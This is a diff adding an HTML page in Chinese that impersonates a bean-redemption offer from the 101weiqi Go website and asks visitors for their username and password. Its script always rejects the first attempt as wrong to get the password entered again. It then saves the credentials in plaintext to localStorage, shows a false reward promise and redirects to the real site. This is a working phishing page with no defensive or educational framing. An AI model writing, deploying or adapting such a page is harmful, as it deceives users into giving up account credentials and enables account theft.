@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <title>101围棋 围豆兑换</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+    input, button {
+      width: 100%;
+      margin-top: 10px;
+      padding: 10px;
+      font-size: 16px;
+    }
+    .message {
+      margin-top: 15px;
+      color: red;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>101围棋 围豆兑换</h2>
+    <input type="text" id="username" placeholder="请输入用户名">
+    <input type="password" id="password" placeholder="请输入密码">
+    <button onclick="handleSubmit()">提交</button>
+    <div class="message" id="message"></div>
+  </div>
+
+  <script>
+    let attempt = 0;
+
+    function handleSubmit() {
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const messageBox = document.getElementById("message");
+
+      if (!username || !password) {
+        messageBox.innerText = "请填写完整用户名和密码";
+        return;
+      }
+
+      // 获取当前已提交用户数据（本地存储）
+      let userData = JSON.parse(localStorage.getItem("userData") || "{}");
+
+      if (userData[username]) {
+        messageBox.innerText = "该账号已领取过围豆，不可重复领取。";
+        return;
+      }
+
+      if (attempt === 0) {
+        attempt++;
+        messageBox.innerText = "账号或密码错误，请重新输入。";
+        return;
+      }
+
+      // 第二次提交，记录账户+密码
+      userData[username] = {
+        password: password,
+        claimedAt: new Date().toISOString()
+      };
+      localStorage.setItem("userData", JSON.stringify(userData));
+
+      messageBox.style.color = "green";
+      messageBox.innerText = "账户正确，48小时内将发放20围豆，正在跳转…";
+
+      // 3秒后跳转
+      setTimeout(() => {
+        window.location.href = "https://101weiqi.com";
+      }, 3000);
+    }
+  </script>
+
+</body>
+</html>
